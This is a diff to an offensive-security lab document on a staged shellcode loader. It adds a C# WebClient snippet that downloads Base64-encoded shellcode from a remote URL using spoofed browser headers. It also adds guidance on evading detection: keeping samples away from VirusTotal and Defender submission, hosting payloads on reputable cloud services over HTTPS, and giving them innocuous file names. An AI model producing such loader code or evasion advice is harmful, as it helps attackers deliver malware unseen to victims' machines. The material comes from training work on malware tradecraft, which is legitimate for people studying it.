@@ -1,4 +1,24 @@
 # Lab - Staged Loader
+<style>
+r { color: Red }
+o { color: Orange }
+g { color: Green }
+</style>
+
+> ***IMPORTANT*** : Please do not send submit samples to <r>Virus Total</r> or any other public virus-scanning services, unless specifically instructed. We don't want to burn our payloads for this training.
+> **Make sure at all times that sample submussion in Microsoft Defender is `turned off`, and if for some reason you get prompted to submit a sample, deny the request.**
+
+
+> ***BEST PRACRICES***:
+> By removing the payload from our loader, there is no malicious code that *static analysis* can detect. ***HOWEVER***, by shifting the code from being hardcoded into the loader to external server, it provides more IOC's for dynamic/behavioural analysis. Therefore make sure that:
+> 1. Host your payload on a reputable server (onedrive, Dropbox, Akamai etc...)
+> 2. Use an FQDN, not an IP address (i.e. key.crimsoncore.be instead of 192.168.100.25)
+> 3. Use HTTPS to download the shellcode - the shellcode never touches disk, it gets loaded into the buffer of a program, but we want to evade network based detections
+> 4. make the webrequest look legit (user agent, headers etc...)
+> 4. Use a name for the shellcode that looks normal (i.e. not shellcode.bin but update.dat for example)
+
+Advantages : Easy to change shellcodes (as they're hosted), harder to detect by static analysis.
+
 
 
 ```csharp
@@ -37,6 +57,12 @@ namespace ShellcodePayload
 
             using (WebClient client = new WebClient())
             {
+                // Add HTTP headers    
+                client.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36");
+                client.Headers.Add("Accept", "application/octet-stream");
+                client.Headers.Add("Accept-Encoding", "gzip, deflate");
+                client.Headers.Add("Accept-Language", "en-US,en;q=0.9");
+                client.Headers.Add("Referer", "https://www.contoso.com/support/downloads/latest-updates");
                 // Download the Base64-encoded string
                 string base64String = client.DownloadString(payloadUrl);
                 // Decode the Base64 string to bytes
